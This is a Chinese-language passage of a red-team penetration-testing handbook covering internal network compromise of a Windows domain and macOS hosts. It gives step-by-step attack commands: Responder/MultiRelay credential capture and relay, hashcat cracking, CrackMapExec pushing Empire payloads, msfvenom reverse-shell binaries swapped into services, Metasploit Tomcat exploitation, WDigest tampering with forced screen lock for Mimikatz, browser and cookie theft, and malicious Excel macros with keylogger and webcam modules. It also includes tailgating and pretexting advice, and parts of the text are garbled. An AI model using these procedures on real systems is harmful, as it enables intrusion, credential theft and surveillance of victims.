  * 最后，将你的 `GPO` 链接到根域\n* 将所有 OS 的用户设置为 `自动登录`（这让测试变得更容易）。每次机器启动或重启时，它将 `自动登录`，以便我们轻松测试从内存中提取\
  \ `凭据` 的攻击：\n    * `https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows`\n\
  \        * `Bit.ly 链接`: `http://bit.ly/2EKatIk`\n\n### 设置 IIS 服务器并配置 SPN\n\n* `https://www.rootusers.com/how-to-install-iis-in-windows-server-2016/`\n\
  \    * `Bit.ly 链接`: `http://bit.ly/2JJQvRK`\n* `https://support.microsoft.com/en-us/help/929650/how-to-use-spns-when-you-configure-web-applications-that-are-hosted-on`\n\
  \    * `Bit.ly 链接`: `http://bit.ly/2IXZygL`\n\n## 无凭据的网络\n\n假设你无法从 `Spraying` 他们的外部服务中获取任何\
  \ `密码`，因此决定潜入大楼。你等到午餐时间后，走到 `Cyber Space Kittens` 的办公室，找到吸烟者的门。虽然你不吸烟，但你知道吸烟者有那种\
  \ `帮派心态`。你点燃一支 `香烟`，与工人闲聊，当他们走进大楼时，你紧随其后，无需任何询问！\n\n既然你已经潜入 `CSK 设施`，你不想因为在那里停留太久而被抓住。你拿出你可靠的\
  \ `drop box`（数据投递箱），找到一个空的办公室，将其插入网络，查看手机，确认它正在 `beacon home`（向家中发送信号），然后迅速回到安全地带。\n\
  \n在家稍微有些出汗时，你迅速跳上你的 `笔记本电脑`，登录你的 `VPN 服务器`，当你的 `drop box beacons` 仍然连接家中时，你松了一口气。现在你可以\
  \ `SSH` 进入你的 `drop box`，其中包含你所有的 `黑客工具`，你可以慢慢发现客户的网络，在箱子之间 `pivot`，并尝试获取你关心的数据。\n\
  \n### Responder\n\n就像之前的行动一样，我们使用了 `Responder` (`https://github.com/lgandx/Responder`)\
  \ 在网络中监听并伪造响应，以获取网络上的 `凭据`。作为 `The Hacker Playbook 2` 的总结，当网络上的系统 `DNS 主机名` 查找失败时，受害者系统使用\
  \ `LLMNR` 进行短期解析，使用 `NBT-NS` 进行备用名称解析。当受害者 PC 的 `DNS 查找` 失败时，受害者开始询问网络上的任何人是否知道该\
  \ `主机名` 的解析方式。\n\n一个简单而普遍的例子：假设你的 PC 有一个固定的挂载驱动器，路径为 `\\\\cyberspacekittenssecretdrive\\\
  secrets`。一天后，IT 部门将该共享驱动器从网络移除，它不再存在。由于你仍然拥有针对服务器名称 `cyberspacekittenssecretdrive`\
  \ 的挂载驱动器，你的系统会不断询问网络是否有人知道它的 IP。现在，这个文件共享示例可能很少见；然而，由于先前连接的系统很可能不再存在于网络上，此问题仍会发生。我们曾在挂载驱动器、具有\
  \ `硬编码服务器` 的 `应用程序`，以及多次 `配置错误` 中见过这种情况。\n\n我们可以使用像 `Responder` 这样的工具，利用那些寻找 `主机名`\
  \ 的系统，并用我们的恶意服务器作出响应。更好的是，`Responder` 可以更进一步，充当 `WPAD` 服务器，将所有数据代理到我们的攻击服务器，但那是另一种攻击方式。\n\
  \n* `cd /opt/Responder`\n* `./Responder.py -I eth0 -wrf`\n\n现在，既然我们处于 `Windows Enterprise`\
  \ 环境中，我们可以假设它很可能运行 `Active Directory`。因此，如果我们能响应来自受害者主机的 `DNS 查找`，我们可以让其系统连接到我们的\
  \ `SMB 共享`。由于他们正在连接驱动器 `\\\\cyberspacekittenssecretdrive`，我们将强制受害者使用其 `NTLMv2 凭据`（或\
  \ `缓存凭据`）。我们捕获的这些凭据将不是直的 `NTLM 哈希`，而是 `NTLM 挑战/响应哈希` (`NTLMv2-SSP`)。这些哈希的唯一问题是它们比正常的\
  \ `NTLM 哈希` 慢得多，但在我们的情况下，这并不成问题（参见 `破解` 部分），因为我们现在有大型 `破解盒` 可供使用。\n\n\n\n![](img/00084.jpeg)我们可以提取\
  \ NTLMv1. 哈希值，将其传递给`hashcat`并破解密码。在`hashcat`中，我们需要指定哈希格式`-m`（[示例哈希](https://hashcat.net/wiki/doku.php?id=example_hashes)）以用于\
  \ NetNTLMv2。\n\n```bash\nhashcat -m 5600 hashes\\ntlmssp_hashes.txt passwordlists/*\n\
  ```现在，假设我们不想破解哈希值，或者我们不介意向用户触发可疑警报，我们可以采取的做法是强制弹出基本身份验证窗口，而不是要求使用 NetNTLMv1.凭据。这可以通过使用`F`（ForceWpadAuth）和`b`（basic\
  \ auth）来实现。\n\n```bash\npython ./Responder.py -I eth0 -wfFbv\n```![](img/00085.jpeg)如下图所示，用户将被提示输入用户名和密码。大多数人会凭直觉盲目输入这些信息。一旦他们提交了凭证，我们就能以明文形式捕获它们！![](img/00086.jpeg)。\n\
  \n### Beta Responder (MultiRelay.py)Responder 和破解 NTLMv2-SSP 哈希的问题在于，破解这些哈希所需的时间通常很长。更糟糕的是，我们在包含长达\
  \ 20+ 字符的密码的环境中也曾遭遇过这种情况。面对这种挑战该怎么办？如果环境未强制启用 SMB 签名（我们可以通过快速的 nmap 脚本扫描发现 - [SMB\
  \ 安全模式文档](https://nmap.org/nsedoc/scripts/smb-security-mode.html)），我们可以利用重放我们捕获的\
  \ SMB 请求来施展一个小把戏。Laurent Gaffie 在 Responder 中添加了一个工具来处理身份验证重放攻击。根据 Laurent 的网站，“`MultiRelay`\
  \ 是 Responder 工具文件夹中强大的渗透测试工具，它允许您针对选定的目标执行定向的 NTLMv1 和 NTLMv2 重放。目前，`MultiRelay`\
  \ 可将 HTTP、WebDav、Proxy 和 SMB 身份验证重放到 SMB 服务器。此工具可定制以满足一组用户向特定目标进行重放的场景。该概念背后的原理是仅针对域管理员、本地管理员或特权账户。”\
  \ [介绍 Responder MultiRelay](http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html)从高级角度看，`MultiRelay\
  \ 将不会强制受害者在我们的 SMB 共享中进行身份验证，而是会将任何身份验证请求重发到我们要选择的受害者主机。当然，用于重放的用户需要能够访问那台其他机器；然而，如果操作成功，则无需处理或破解任何密码。要开始使用，我们需要配置\
  \ Responder 和`MultiRelay`：\n\n*   编辑 Respondetresponder 配置文件以禁用 SMB 和 HTTP 服务器\n\
  \    *   `gedit Responder.conf`\n    *   将 SMB 和 HTTP 选项更改为`Off`\n*   启动 Responder\n\
  \    *   `python ./Responder.py -I eth0 -rv`\n*   在新终端窗口中启动`MultiRelay`\n    * \
  \  `/opt/Responder/tools`\n    *   `./MultiRelay.py -t <target host> -c <shell command>\
  \ -u ALL`\n\n一旦可以向受害者主机成功重放，我们需要考虑在受害者工作站上执行的操作。默认情况下，`MultiRelay 可以生成基本 shell，但我们也可以自动执行\
  \ Meterpreter PowerShell 负载、Empire PowerSheltload 帝国 PowerShell 荷载、我们的 dnsC2at2PwsheldnsCat2\
  \ 功率外壳脚本下载和执行控制代理 (c2)、Mimikatz，或者仅仅是为了好玩运行 calc.exe。![](img/00087.jpeg)。\n\n###\
  \ 参考资料\n\n*   [跳过破解 Responder 哈希并重放它们](http://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/)\n\
  \n### PowerShell Responder 一旦我们攻破了 Windows 系统，我们就可以利用受害者的 PowerShell 执行类似 Responder\
  \ 的攻击。原始 Respondertwer 的两个功能可以通过以下两个工具来实现：\n\n*   `Inveigh` - [来源地址](https://github.com/Kevin-Robertson/Inveigh/blob/master/scripts/inveigh.ps1)\n\
  *   `inveagh-relay 要将其简化，所有这些已经在 Empire 中被构建好了。## 无凭据的用户枚举一旦我们进入网络，我们可以使用 Responder\
  \ 获取凭据或 shell，但有时 SMB 签名已启用，导致破解 NTLMv2 SSP 不可行。这时我们需要退一步，从基础做起。在没有积极扫描网络的情况下，我们需要获取用户列表（可能用于密码喷洒甚至社会工程学攻击）。一种选项是从开始枚举域控制器的用户算起。历史上（回溯到\
  \ 2003 年），我们可以尝试进行 RID 循环来获取所有用户账户列表。虽然这种方法已不再可用，但仍有其他选项可以暴力破解账户。一个方案是利用 Kerberos：\n\
  \n```bash\nnmap -p88 --script krb5-enum-users --scriptargs \"krb5_enum_users.realm=cyberspacekittens.local\"\
  ,userdb=/opt/userlist.txt <Domain Controller IP>\n```![](img/00088.jpeg))我们需要提供用户名单进行测试，但由于我们只是查询域控制器\
  \ (DC) 而不是对其进行身份验证，这种活动通常不会被检测到。现在，我们可以获取这些用户账户并开始再次进行密码喷洒！## 使用 CrackMapExec (CME)\
  \ 扫描网络如果我们尚未攻入系统，但我们通过 Responder、配置错误的 Web 应用程序、暴力破解或打印机攻击获得了凭据的访问权限，那么我们可以尝试扫描网络，查看该帐户可以在哪里登录。简单的扫描工具如`CrackMapExec`(cme)可以帮助找到内部网络的初始进入点。历史上，我们一直使用\
  \ CME 扫描网络、通过网络进行 SMB 身份验证、远程执行命令到达许多主机，甚至通过 Mimikatz 提取明文凭据。随着 Empire 和 CME 的新功能，我们可以利用\
  \ Empire 的 REST API 功能。在以下场景中，我们将启动带有 RESTAPI 接口的 Empire 系统，在 CME 中更改密码以便让 CME 连接到\
  \ Emprie，扫描网络我们拥有的单个凭据以进行登录尝试，最后如果在身份验证成功的情况下会自动向远程受害者系统推送 Empire 负载如果您拥有 Helpdesk\
  \ 支持或特权账户，请为大量 Empireshell 做好准备！\n\n```bash\n#Start Empired's REST API server\n\
  cd /opt/Empire\n./empire --rest --password 'hacktheuniverse'\n```\n\n```bash\n#Change\
  \ the CrackMapExec Passwordgedit /root/.cme/cme.conf\npassword=hacktheuniversity\n\
  ```\n\n```bash\n# Run CME to spawn Empire shells\ncme smb 10.100.100.0/24 -d 'cyberspacekittens.local'\
  \ -u '<username>' -p '<password>' -M empire_exec -o LISTENER=http\n```![](img/00089.jpeg)![](img/00090.jpeg)。\n\
  \n## 攻陷初始主机后一旦通过社会工程学、Drop Boxes（如 Dropbox）、Responder、攻击打印机或其他手段获取了对主机的访问权限，下一步该做什么？这一直是一个价值千万的问题。在过去，一切重点都在于理解我们在哪里以及周围的网络布局。我们最初可能会运行类似于\"\
  netstat -ano\"的命令以找到受害者服务器所在域和用户所在的 IP 地址范围位置。我们还可以运命令如\"ps\"或\"sc queryex type=\
  \ service state= all | find \"_NAME\"\"来列出所有运行的服务并查找防病毒软件或其他主机基本保护程序以下是我们在初期可能运行的一些其他示例命令：\n\
  \n网络信息:\n*   `netstat -anop|findstr LISTEN`进程列表:*tasklist /v 系统主机信息:*sysinfo*Get-WmiObject-class\
  \ win32-operatingsystem | select-property*-exportcsv c:\\temp\\os.txt*wmic qfegetCaption,DescriptionHotFixID.InstalledOn\
  \ 简单文件搜索：\n    *   `dir /s *password*:findstr /sn/ii/foo*findstr/sipass*.txt**ini\
  \ 来自共享或挂载驱动器的信息:**powershell-Command\"Get-WmiObject-ClassWin32_Share\"*powerShell-command\"\
  get-psdrive\"*PowerShell-COmmmand:Get Wmionobeclasswin35_mappedlogicaldisk|selectname_ProviderName\n\
  \n\n\n说真的，没人有空去记住所有这些命令，但幸运的是！我相信，基于《RTFM》这本书（一个很好的资源），leostat 创建了一个快速 Python 脚本，其中包含大量这些方便的命令，可以通过名为\
  \ rtfm.py 的工具轻松搜索 (https://github.com/leostat/rtfm)。\n\n*   更新并运行 RTFM\n\n    *\
  \   `cd` `/opt/rtfm`\n    *   `chmod` `+x` `rtfm.py`\n    *   `./rtfm.py` `-u`\n\
  \    *   `./rtfm.py` `-c` `'rtfm'`\n\n*   搜索所有标签\n    *   `./rtfm.py` `-Dt`\n\n\
  *   查看每个标签下的所有查询/命令。我喜欢使用的是枚举类别\n    *   `./rtfm.py` `-t` `enumeration` `|` `more`\n\
  \n![](img/00091.jpeg)\n\n现在，RTFM 相当全面，包含大量不同的有用命令。这是在任何行动期间都非常好的快速资源。\n\n这些都是我们一直以来为了获取信息所做的工作，但如果我们能从环境中获取更多信息呢？使用\
  \ PowerShell，我们可以获取所需的环境/网络信息。由于 PowerShell 可以轻松从任何 C2 工具执行，你可以使用 Empire、Metasploit\
  \ 或 Cobalt Strike 来执行这些实验。在接下来的示例中，我们将使用 Empire，但你可以随意尝试其他工具。\n\n## 权限提升\n\n有各种各样的方法可以从普通用户提升到特权账户。\n\
  \n未加引号的服务路径：\n\n*   这是一种相对简单且常见的漏洞，即服务可执行文件路径未被引号包围。这会被利用，因为如果路径周围没有引号，我们可以滥用当前服务。假设我们有一个配置为执行\
  \ `C:\\Program Files (x86)\\Cyber Kittens\\Cyber Kittens.exe` 的服务。如果我们拥有对 `Cyber\
  \ Kittens` 文件夹的写入权限，我们可以将恶意软件放置在 `C:\\Program Files (x86)\\Cyber Kittens\\Cyber.exe`\
  \ 位置（注意 `Kittens.exe` 缺失）。如果该服务以系统权限运行，我们可以等待服务重启，让我们的恶意软件以特权账户运行。\n\n*   如何查找易受攻击的服务路径：\n\
  \    *   `wmic` `service` `get` `name,displayname,pathname,startmode` `|findstr`\
  \ `/i` `\"Auto\"` `|findstr` `/i` `/v` `\"C:\\Windows\\\\\"` `|findstr` `/i` `/v`\
  \ `\"\"\"`\n    *   查找 `BINARY_PATH_NAME`\n\n查找服务的不安全注册表权限：\n*   识别允许更新服务映像路径位置的弱权限\n\
  *   检查 `AlwaysInstallElevated` 注册表键是否启用：\n    *   检查 `AlwaysInstallElevated` 注册表键，该键决定\
  \ `.MSI` 文件是否应以提升权限（`NT AUTHORITY\\SYSTEM`）安装\n    *   https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always_install_elevated.rb\n\
  \n请注意，我们实际上不必手动执行这些操作，因为已经专门为 Windows 创建了一些优秀的 Metasploit 和 PowerShell 模块。在以下示例中，我们将查看\
  \ `PowerUp` PowerShell 脚本 (https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/PowerUp.ps1)。在这种情况下，该脚本与\
  \ Empire 配合使用，将运行所有常见的错误配置区域，这些配置允许普通用户获取本地管理员或系统账户。在下面的示例中，我们在受害机系统上运行了此脚本，并发现了一些针对\
  \ `localsystem` 的未加引号的服务路径。现在，我们可能无法重启服务，但我们应该能够利用该漏洞并等待重启。\n\n*   Empire PowerUp\
  \ 模块：\n    *   `usermodule` `privesc/powerup/allchecks`\n\n![](img/00092.jpeg)\n\
  \n一眼就能看出：\n\n`ServiceName` : `WavesSysSvc`\n\n`Path` : `C:\\Program Files\\Waves\\\
  MaxxAudio\\WavesSysSvc64.exe`\n\n`ModifiableFile` : `C:\\Program Files\\Waves\\\
  MaxxAudio\\WavesSysSvc64.exe`\n\n`ModifiableFilePermissions` : `{WriteOwner, Delete,\
  \ WriteAttributes, Synchronize...}`\n\n`ModifiableFileIdentityReference` : `Everyone`\n\
  \n`StartName` : `LocalSystem`\n\n看起来 `WavesSysSvc` 服务可由所有人写入。这意味着我们可以将 `WavesSysSvc64.exe`\
  \ 文件替换为我们自己的恶意二进制文件：\n\n*   创建 Meterpreter 二进制文件（稍后将讨论如何绕过 AV）\n    *   `msfvenom`\
  \ `-p` `windows/meterpreter/reverse_https` `LHOST=[ip]` `LPORT=8080` `-f` `exe`\
  \ `> shell.exe`\n\n*   使用 Empire 上传二进制文件并替换原始二进制文件\n    *   `upload` `./shell.exe`\
  \ `C:\\\\users\\\\test\\\\shell.exe`\n    *   `shell` `copy` `C:\\users\\test\\\
  Desktop\\shell.exe` `\"C:\\Program Files\\Waves\\MaxxAudio\\WavesSysSvc64.exe\"\
  `\n\n*   重启服务或等待重启\n\n一旦服务重启，你应该会重新获得以 system 权限运行的 Meterpreter 会话！使用 PowerUp，你会发现许多潜在易受权限提升攻击的不同服务。如果你想深入了解\
  \ Windows 权限提升背后问题的基础知识，请查看 FuzzSecurity 的文章：http://www.fuzzysecurity.com/tutorials/16.html。\n\
  \n对于未打补丁的 Windows 系统，我们确实有一些首选的权限提升攻击方法，例如 (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)\
  \ 和 (https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135)，但我们如何快速识别\
  \ Windows 系统上安装了哪些补丁？我们可以使用受害机系统上的默认命令来查看安装了哪些服务包。Windows 自带默认命令 `systeminfo`，它将提取任何给定\
  \ Windows 主机的所有补丁历史记录。我们可以将该输出推送到我们的 Kali 系统，并运行 Windows Exploit Suggester 来查找针对这些漏洞的已知漏洞利用。\n\
  \n回到你的 Windows 10 受害机系统：\n\n*   `systeminfo`\n*   `systeminfo` `> windows.txt`\n\
  *   将 `windows.txt` 复制到 `/opt/Windows-Exploit-Suggester` 下的 Kali 机器中\n*   `python`\
  \ `./windows-exploit-suggester.py` `-i` `./windows.txt` `-d` `2018-03-21-mssb.xls`\n\
  \n![](img/00093.jpeg)\n\n这个工具已经有一段时间没有积极维护了，但你可以轻松添加你正在寻找的权限提升漏洞。\n\n在完全打补丁的 Windows\
  \ 环境中，我们关注第三方软件中的不同权限提升漏洞或操作系统的新漏洞/0-day 漏洞。例如，我们经常寻找像这样的漏洞 http://bit.ly/2HnX5id，这是一种\
  \ Windows 权限提升漏洞，目前看来尚未打补丁。通常在这些场景中，可能会有一些基本的 POC 代码，但测试、验证并最终完成漏洞利用的任务在于我们。我们定期监控的公共权限提升漏洞领域包括：\n\
  http://insecure.org/search.html?q=privilege%20escalation\n*   https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids\n\
  \n通常，这只是关于时机的问题。例如，当发现漏洞时，这可能就是你在系统打补丁之前进一步破坏系统的有限机会窗口。\n\n## 权限提升实验\n\n测试和尝试不同权限提升漏洞的最佳实验平台是\
  \ Rapid7 的 Metasploitable3 (https://github.com/rapid7/metasploitable3)。这个易受攻击的框架会自动构建一个\
  \ Windows VM，包含所有常见和一些不常见的漏洞。虽然设置需要一点时间，但一旦 VM 配置完成，它是一个很好的测试实验室。\n\n为了引导你快速示例并让你开始：\n\
  \n*   对 Metasploitable3 进行 `nmap` 扫描（确保扫描所有端口，以免遗漏某些端口）\n*   你会看到端口 8383 上运行着 ManageEngine\n\
  *   启动 Metasploit 并搜索任何 ManageEngine 漏洞\n    *   `msfconsole`\n    *   `search`\
  \ `manageengine`\n    *   `use` `exploit/windows/http/manageengine_connectionid_write`\n\
  \    *   `set` `SSL` `True`\n    *   `set` `RPORT` `8383`\n    *   `set` `RHOST`\
  \ `<Your IP>`\n    *   `exploit`\n    *   `getsystem`\n*   你会注意到你无法获得 system 权限，因为你破坏的服务不是以特权进程运行的。在这里你可以尝试所有不同的权限提升攻击。\n\
  \n\n\n\n*   我们看到的是，`Apache Tomcat` 正在作为`特权进程`运行。如果我们可以滥用此服务，我们可能能够以更高权限的服务执行我们的有效载荷（payload）。我们看到`Apache\
  \ Tomcat`在外部端口`8282`上运行，但它需要用户名和密码。既然我们拥有用户态（userland）shell，我们可以尝试在磁盘上搜索该密码。这就是我们要在互联网上搜索的地方，或者谷歌搜索\"\
  Tomcat 密码存储在哪里”。结果，`tomcat-users.xml`。\n\n*   在受害机器上，我们可以搜索并读取`tomcat-users.xml`文件：\n\
  \    *   `shell`\n    *   `cd \\` && dir /s tomcat-users.xml`\n    *   `type \"\
  C:\\Program Files\\Apache Software Foundation\\tomcat\\apache-tomcat-8.0.33\\conf\\\
  tomcat-users.xml`\n\n*   现在，让我们用找到的密码攻击`Tomcat`。首先，登录到端口`8282`的 Tomcat 管理控制台，查看我们的密码是否有效。然后，我们可以使用\
  \ `Metasploit`通过 Tomcat 部署恶意 WAR 文件。\n    *   `search tomcat`\n    *   `use exploit/multi/http/tomcat_mgr_upload`\n\
  \    *   `show options`\n    *   `set HTTPusername sploit`\n    *   `set HTTPpassword\
  \ sploit`\n    *   `set RPORT 8282`\n    *   `set RHOST <Metasploitable3_IP>`\n\
  \    *   `set Payload java/shell_reverse_tcp`\n    *   `set LHOST <Your IP>`\n \
  \   *   `exploit`\n    *   `whoami`\n\n*   你现在应该处于`System`状态。我们利用第三方工具提权到`System`。\n\
  \n## `从内存中提取明文凭证`\n\n`Mimikatz` (https://github.com/gentilkiwi/mimikatz) 已经存在一段时间，它在获取明文密码方面改变了游戏规则。在\
  \ Windows 10 之前，作为`本地管理员`在主机系统上运行 Mimikatz，允许攻击者从 `LSASS`（本地安全子系统服务）中提取明文密码。这一直有效，直到\
  \ Windows 10 的出现，使得即使作为 `本地管理员`也无法读取它。现在，我见过一些奇怪的用例，其中 `Single Sign-On`（单点登录）或某些独特的软件将密码放回\
  \ LSASS，供 Mimikatz 读取，但我们将暂时忽略这些。在本章中，我们要讨论在无效时（如 Windows 10）该怎么做。\n\n假设你已经攻陷了 Windows\
  \ 10 工作站并提权到`本地管理员`。默认情况下，你会运行 Mimikatz，根据下方的查询，你会看到密码字段为`NULL`。\n\n![](img/00094.jpeg)\n\
  \n那么你能做什么？最简单的选项是设置注册表项，将密码放回 LSASS。在`HKLM`中有一个`UseLogonCredential`设置，如果设置为`0`，将凭证存储回内存（http://bit.ly/2vhFBiZ）：\n\
  \    *   `reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\\
  WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`\n    *   在 `Empire`中，我们可以通过\
  \ shell 命令运行此命令：\n    *   `shell reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\\
  SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`\n\n这个设置的问题是我们需要用户重新登录系统。你可以引起屏幕超时、重启或注销，以便能够再次捕获明文凭证。但最简单的方法是将他们的工作站锁定（以便他们不丢失任何工作……看看我们有多好？）。触发锁定屏幕：\n\
  \    *   `rundll32.exe user32.dll,LockWorkStation`\n\n一旦我们引起锁定屏幕，让他们重新登录，我们可以再次运行\
  \ Mimikatz 获取明文密码。\n\n![](img/00095.jpeg)\n\n如果我们无法访问`本地管理员账户`？我们有什么其他选项来获取用户的凭证？以前的时候，常见的渗透测试攻击是查看用户态内存中的厚客户端，查看凭证是否以明文存储。现在一切都基于浏览器，我们是否可以在浏览器中做同样的事情？\n\
  \n这就是 `putterpanda`制作了一个很酷的 POC（概念验证）风格工具来完成这项工作，称为`Mimikittenz` (https://github.com/putterpanda/mimikittenz)\
  \ 。Mimikittenz 做了什么？它利用 Windows 函数`ReadProcessMemory()`，从各种目标进程（如浏览器）中提取纯文本密码。\n\
  \n`Mimikittenz` 为 `Gmail`、`Office365`、`Outlook Web`、`Jira`、`Github`、`Bugzilla`、`Zendesk`、`Cpanel`、`Dropbox`、`Microsoft\
  \ OneDrive`、`AWS Web Services`、`Slack`、`Twitter`和`Facebook`预加载了大量的内存搜索查询。也很轻松地在\
  \ Mimikittenz 中编写搜索表达式。\n\n这个工具最好的部分是它不需要`本地管理权限`，因为它是完全用户态内存。一旦我们攻陷了一个主机，我们将把 Mimikittenz\
  \ 导入内存，并运行`Invoke-mimikittenz`脚本。\n\n![](img/00096.jpeg)\n\n如上所示，用户登录了`Github`，我们能够从浏览器的内存中提取他们的用户名和密码。现在，希望大家能将该工具提升到下一个水平，并为不同的应用程序创建更多的搜索查询。\n\
  \n## `从 Windows 凭证存储和浏览器中获取密码`\n\nWindows `Credential Store`（凭证存储）是 Windows 的默认功能，用于保存系统、网站和服务器的用户名、密码和证书。当你使用\
  \ Microsoft `IE/Edge`进行网站身份验证时，通常会出现一个弹出窗口询问“你想要保存你的密码吗？”凭证存储就是存储这些信息的地方。在凭证管理器中，有两种类型的凭证：`Web`和`Windows`。你还记得哪个用户可以访问这些数据？不是\
  \ `system`，而是登录并可以检索此信息的用户。这对我们来说很棒，因为对于任何钓鱼或代码执行，我们通常都是该人员的权限。最好的部分是，我们甚至不需要是 `本地管理员`\
  \ 才能提取这些数据。\n\n![](img/00097.jpeg)\n\n如何提取此信息？我们可以导入两个不同的 `PowerShell`脚本来收集这些数据：\n\
  *   收集 `Web Credentials`（网络凭证）：\n    *   https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1\n\
  *   收集 `Windows Credentials`（仅适用于 `Generic` 类型，不适用于 `Domain`）：\n    *   https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1\n\
  \n![](img/00098.jpeg)\n\n从转储中可以看到，我们拉取了他们存储的`Facebook`凭证以及他们拥有的任何`generic`凭证。请记住，对于\
  \ Web 凭证，`Get-WebCredentials`只会从 `Internet Explorer/Edge`获取密码。如果我们需要从 `Chrome`获取，我们可以使用\
  \ `Empire`的 `powershell/collection/ChromeDump` 载荷。在使用 ChromeDump 之前，你需要先终止 Chrome\
  \ 进程，然后运行 ChromeDump。最后，我喜欢提取所有浏览器历史和 Cookie。我们不仅可以了解他们的内部服务器的很多细节，而且，如果他们的会话仍然活着，我们可以使用他们的\
  \ Cookie 并进行身份验证，而无需知道他们的密码！\n\n使用 `PowerShell`脚本，如：https://github.com/sekirkity/BrowserGather，我们可以提取所有`Browser\
  \ Cookies`（浏览器 Cookie），窃取它们，并将我们的浏览器隧道化以利用这些 Cookie，所有操作都不需要提权。\n\n![](img/00099.jpeg)\n\
  \n接下来，我们甚至可以开始在受害者的系统上寻找所有第三方软件中的服务器和凭证。一个名为 `SessionGopher` (https://github.com/fireeye/SessionGopher)\
  \ 的工具可以从 `WinSCP`、`PuTTY`、`SuperPuTTY`、`FileZilla`和`Microsoft Remote Desktop`中抓取主机名和保存的密码。其他包含的功能还包括从网络上其他系统的本地凭证中远程抓取的能力。启动\
  \ SessionGopher 的最简单方法是导入 `PowerShell`脚本并使用以下命令执行：\n*   加载 `PowerShell` 文件：\n  \
  \  *   `. .\\SessionGopher.ps1`\n*   执行 `SessionGopher`\n    *   `Invoke-SessionGopher\
  \ -Thorough`\n\n\n\n\n以下是我们从不提权、绕过 UAC 或开启键盘记录器获取主系统凭据的几种方式之一。由于我们处于用户上下文中，因此可以访问主机上的许多资源，以帮助我们将攻击路径继续推进至利用阶段。\n\
  \n## 从 OSX 获取本地凭据和信息\n\nTHP（横向渗透）中的大多数侧向移动针对的是 Windows 环境。这是因为几乎所有中型和大型使用 Active\
  \ Directory 来管理系统和服务器的环境中都采用这种方式。我们每年都会越来越多地遇到 Mac，因此也想确保将其纳入其中。一旦进入某个环境，许多攻击方式与\
  \ Windows 世界的攻击类似（例如：扫描默认凭据、Jenkins/应用类攻击、嗅探网络以及通过 SSH 或 VNC 进行侧向移动）。\n\n有几种载荷支持\
  \ Mac 系统，其中最受欢迎的之一是利用 Empire 工具。Empire 可以生成多种类型的载荷来诱骗受害者执行我们的代理程序，其中包括鸭子脚本 (ducky\
  \ scripts)、应用程序、Office 宏、Safari 启动器、软件包等。例如，我们可以创建一个类似于在 Windows PowerShell Empire\
  \ 中制作过的 Office 宏：\n\n1.  **启动 Empire**\n2.  首先，请确保按照本书开始时的操作配置您的 Empire 监听器\n3.\
  \  接下来，我们需要构建一个 OSX 宏载荷\n    1.  `usestager` `osx/macro`\n4.  设置输出文件 (OutFile) 以将其写入本地文件系统\n\
  \    1.  `set` `OutFile` `/tmp/mac.py`\n5.  **生成载荷**\n\n![images/00100.jpeg](img/00100.jpeg)![](img/00101.jpeg)\n\
  \n如果您查看生成的 Office 宏文件，您会发现它只是由 Python 执行的 Base64 代码。幸运的是对我们而言，Python 是 Mac 系统的默认应用程序，当该宏被执行时，我们应该能收到我们的代理信标\
  \ (beacon)。\n\n要在 Mac 上创建恶意的 Excel 文件，可以打开一个新的 Excel 工作表，然后依次点击“工具”、“查看宏”，在“在此 workbook\
  \ 中建立宏”，一旦 Microsoft Visual Basic 编辑器弹出，删除所有现有代码并将其替换为您新的宏代码。最后将其保存为`.xlsm`文件。\n\
  \n![images/00102.jpeg](img/00102.jpeg)![](img/00103.jpeg)\n\n现在，将您的恶意文件发送给受害者并观察\
  \ Empire 代理程序的涌入情况。在受害者端，当他们打开 Excel 文件后，界面大致如下所示：\n\n![images/00104.jpeg](img/00104.jpeg)\n\
  \n务必编造一个合理的故事诱导他们点击“启用宏”。\n\n一旦您的代理连接回您本地的 Empire 服务器，侦察阶段也相当类似。我们需要执行以下操作：\n\n\
  *   转储浏览器信息和密码：`usemodule` `collection/osx/browser_dump`\n*   开启键盘记录器：`usemodule`\
  \ `collection/osx/keylogger`\n*   触发应用提示以捕获密码：`usemodule` `collection/osx/prompt`\n\
  *   尽量利用摄像头拍照也很有帮助：`usemodule` `collection/osx/webcam`\n\n## 在 Windows 域环境中“利用本地资源”\
  \ (Living Off the Land)\n\n再次，在下方的示例中，我们将使用 PowerShell Empire。不过，您也可以使用 Metasploit、Cobalt\
  \ Strike 或类似工具进行相同风格的攻击。只要您能够将 PowerShell 脚本导入内存并避开主机系统防护即可，具体使用的工具其实并不重要。\n\n现在您已经成功攻破受害者机器并从其工作站窃取所有秘密信息，了解了受害者浏览过的部分网站数据并运行了一些`netstat`式的侦察……接下来该做什么呢？\n\
  \n对于红队（Red Teamer）而言，关键在于在服务器、工作站、用户、服务以及 Active Directory 环境中找到可靠的信息。在许多情况下，我们无法运行任何漏洞扫描甚至是`nmap`扫描，因为存在被警报或抓获的风险。那么我们该如何利用网络和服务的“功能”来查找我们需要的所有信息呢？\n\
  \n### 服务主名称 (Service Principal Names)\n\n服务主名称（SPN）是 Windows 的一项功能，允许客户端唯一标识服务的实例。Kerberos\
  \ 认证使用 SPN 将服务实例与服务登录帐户关联起来 [https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx]。例如，您可能为运行\
  \ MSSQL 服务器、HTTP 服务器、打印服务器的服务账户配置了 SPN 以及其他各类服务账户的 SPN。对于攻击者而言，查询 SPN 是枚举阶段至关重要的一部分。这是因为任何域用户帐户都可以向\
  \ Active Directory 中查询所有与 AD 关联的服务帐户/服务器信息。我们无需扫描单个主机即可识别所有的数据库和 Web 服务器！\n\n作为攻击者，我们可以利用这些“功能”来查询\
